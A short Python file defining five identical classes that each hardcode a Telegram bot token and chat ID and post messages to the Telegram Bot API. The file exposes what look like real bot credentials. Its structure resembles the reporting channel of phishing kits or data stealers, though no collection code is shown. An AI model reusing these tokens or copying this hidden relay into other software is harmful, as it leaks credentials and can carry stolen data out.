import requests

class ReSsX1:
    def __init__(self):
        
        self.token = '7206461105:AAGN6e-IxFsWB8pesOgW3UU-i2cEXVh5k1s'
        self.chat_id = '1945109862'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        

class ReSsX2:
    def __init__(self):
        
        self.token = '6863539178:AAG5LVGwYhhBVHw4jj0VOd1n8O-w2AjluiI'
        self.chat_id = '1566020530'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        

class ReSsX3:
    def __init__(self):
        
        self.token = '7457752635:AAH6qmpFTtUrU34ztDDhqM65Nkl4thFxaY4'
        self.chat_id = '6762126728'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        

class ReSsX4:
    def __init__(self):
        
        self.token = '7017581676:AAGwd2ibwJTVxIgIS8Y1kcdrZvnilAkdJjs'
        self.chat_id = '1945109862'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)
        

class ReSsX5:
    def __init__(self):
        
        self.token = '7093765060:AAEja2e4ppFBfMQ-cOwcfCd-vC4S_BztWrs'
        self.chat_id = '1945109862'

    def telegram(self, message):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        params = {
            'chat_id': self.chat_id,
            'text': message
        }
        response = requests.post(url, params=params)